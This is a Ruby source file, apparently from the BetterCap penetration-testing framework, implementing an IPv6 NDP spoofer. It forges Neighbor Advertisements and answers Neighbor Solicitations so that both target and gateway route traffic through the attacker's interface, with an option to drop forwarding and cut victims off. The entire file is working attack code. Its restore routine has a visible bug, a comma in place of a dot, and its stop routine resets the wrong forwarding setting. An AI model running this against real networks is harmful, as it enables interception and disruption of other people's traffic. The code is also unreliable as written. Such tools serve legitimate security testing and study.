# encoding: UTF-8

module BetterCap
module Spoofers
# This class is responsible of performing NDP spoofing on the network.
class Ndp < Base
  # Initialize the BetterCap::Spoofers::NDP object.
  def initialize
    @ctx          = Context.get
    @forwarding   = @ctx.firewall.ipv6_forwarding_enabled?
    @spoof_thread = nil
    @sniff_thread = nil
    @capture      = nil
    @running      = false

    update_gateway!
  end

  # Send a spoofed NDP reply to the target identified by the +daddr+ IP address
  # and +dmac+ MAC address, spoofing the +saddr+ IP address and +smac+ MAC
  # address as the source device.
  def send_spoofed_packet( saddr, smac, daddr, dmac )
    pkt = PacketFu::NDPPacket.new
    pkt.eth_saddr = smac
    pkt.eth_daddr = dmac
    pkt.eth_proto = 0x86dd

    pkt.ipv6_saddr = saddr
    pkt.ipv6_daddr = daddr
    pkt.ipv6_recalc

    if @ctx.gateway.ip == daddr
      pkt.ndp_set_flags = "001"
    else
      pkt.ndp_set_flags = "111"
    end

    pkt.ndp_type = 136
    pkt.ndp_taddr = saddr
    pkt.ndp_opt_type = 2
    pkt.ndp_opt_len = 1
    pkt.ndp_lladdr = smac

    pkt.ndp_recalc

    @ctx.packets.push(pkt)
  end

  # Start the NDP spoofing.  
  def start
    Logger.debug "Starting NDP spoofer ( #{@ctx.options.spoof.half_duplex ? 'Half' : 'Full'} Duplex ) ..."

    stop() if @running
    @running = true

    if @ctx.options.spoof.kill
      Logger.warn "Disabling packet forwarding."
      @ctx.firewall.enable_ipv6_forwarding(false) if @forwarding
    else
      @ctx.firewall.enable_ipv6_forwarding(true) unless @forwarding
    end

    @sniff_thread = Thread.new { ndp_watcher }
    @spoof_thread = Thread.new { ndp_spoofer }
  end

  # Stop the NDP spoofing, reset firewall state and restore targets IPv6 table.
  def stop
    raise 'NDP spoofer is not running' unless @running

    Logger.debug 'Stopping NDP spoofer ...'

    @running = false
    begin
      @spoof_thread.exit
    rescue
    end

    Logger.debug "Restoring IPv6 table of #{@ctx.targets.size} targets ..."

    @ctx.targets.each do |target|
      if target.spoofable?
        5.times do
          spoof(target, true)
          sleep 0.3
        end
      end
    end

    Logger.debug "Resetting packet forwarding to #{@forwarding} ..."

    @ctx.firewall.enable_forwarding( @forwarding )
  end

  private

  # Send an NDP spoofing packet to +target+, if +restore+ is true it will
  # restore its IPv6 cache instead.
  def spoof( target, restore = false )
    if restore
      send_spoofed_packet( @ctx.gateway.ip, @ctx.gateway.mac, target.ip, target.mac )
      send_spoofed_packet( target.ip, target.mac, @ctx.gateway.ip, @ctx,gateway.mac ) unless @ctx.options.spoof.half_duplex
    else
      # tell the target we're the gateway
      send_spoofed_packet( @ctx.gateway.ip, @ctx.iface.mac, target.ip, target.mac )
      # tell the gateway we're the target
      send_spoofed_packet( target.ip, @ctx.iface.mac, @ctx.gateway.ip, @ctx.gateway.mac ) unless @ctx.options.spoof.half_duplex
    end
  end

  # Main spoofer loop.
  def ndp_spoofer
    spoof_loop(1) { |target|
      if target.spoofable?
        spoof(target)
      end
    }
  end

  # Return true if the +pkt+ packet is an NDP 'who-has' query coming
  # from some network endpoint.
  def is_ndp_query?(pkt)
    begin
      # we're only interested in 'who-has' packets
      return ( pkt.ndp_type == 135 and \
               pkt.ipv6_saddr.to_s != @ctx.iface.ip )
    rescue; end
    false
  end

  # Will watch for incoming Neighbor Solicitation messages and spoof the source address.
  def ndp_watcher
    Logger.debug 'NDP watcher started ...'

    sniff_packets('icmp6') { |pkt|
      if is_ndp_query?(pkt)
        Logger.info "[#{'NDP'.green}] #{pkt.ipv6_saddr.to_s} is asking who #{pkt.ipv6_daddr.to_s} is."
        send_spoofed_packet pkt.ipv6_daddr.to_s, @ctx.iface.mac, pkt.ipv6_saddr.to_s, pkt.eth_saddr
      end
    }
  end
end
end
end
